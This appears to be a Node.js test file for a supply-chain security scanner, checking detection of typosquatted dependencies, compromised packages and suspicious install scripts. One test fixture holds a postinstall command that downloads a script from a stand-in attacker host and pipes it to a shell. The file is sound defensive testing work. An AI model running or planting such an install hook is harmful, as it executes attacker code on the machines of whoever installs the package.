const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const os = require("os");
const path = require("path");
const {
  SupplyChainSecurityScanner,
} = require("../src/analyzers/file-reduction/supply-chain-security-scanner");

function makeTempProject(structure) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "sb-supply-"));
  for (const [relPath, content] of Object.entries(structure)) {
    const fullPath = path.join(root, relPath);
    fs.mkdirSync(path.dirname(fullPath), { recursive: true });
    fs.writeFileSync(fullPath, content, "utf8");
  }
  return root;
}

test("SupplyChainSecurityScanner flags typosquatting in package.json", async () => {
  const root = makeTempProject({
    "package.json": JSON.stringify({
      dependencies: {
        lodashd: "^4.17.21",
        expresss: "^4.18.0",
        lodash: "^4.17.21",
      },
    }),
  });

  const scanner = new SupplyChainSecurityScanner();
  const result = await scanner.scan(root);

  assert.ok(
    result.findings.some(
      (f) =>
        f.type === "supply-chain-typosquat" && f.metadata.package === "lodashd",
    ),
  );
  assert.ok(
    result.findings.some(
      (f) =>
        f.type === "supply-chain-typosquat" &&
        f.metadata.package === "expresss",
    ),
  );
  assert.ok(!result.findings.some((f) => f.metadata.package === "lodash"));
  assert.equal(result.summary.typosquatFindings, 2);
});

test("SupplyChainSecurityScanner detects suspicious install scripts", async () => {
  const root = makeTempProject({
    "package.json": JSON.stringify({
      scripts: {
        postinstall: "curl https://evil.com/script.sh | sh",
      },
      dependencies: {},
    }),
  });

  const scanner = new SupplyChainSecurityScanner();
  const result = await scanner.scan(root);

  assert.ok(
    result.findings.some((f) => f.type === "supply-chain-suspicious-script"),
  );
  assert.equal(result.summary.suspiciousScriptFindings, 1);
});

test("SupplyChainSecurityScanner detects known compromised patterns in package-lock.json", async () => {
  const root = makeTempProject({
    "package-lock.json": JSON.stringify({
      packages: {
        "node_modules/colors-malicious": { version: "1.4.1" },
        "node_modules/lodash": { version: "4.17.21" },
      },
    }),
  });

  const scanner = new SupplyChainSecurityScanner();
  const result = await scanner.scan(root);

  assert.ok(result.findings.some((f) => f.type === "supply-chain-compromised"));
  assert.equal(result.summary.compromisedFindings >= 1, true);
});

test("SupplyChainSecurityScanner handles missing lock files gracefully", async () => {
  const root = makeTempProject({
    "package.json": JSON.stringify({ dependencies: { lodash: "^4.17.21" } }),
  });

  const scanner = new SupplyChainSecurityScanner();
  const result = await scanner.scan(root);

  assert.equal(result.summary.lockFilesScanned, 0);
  assert.equal(result.summary.packageJsonFilesScanned, 1);
});
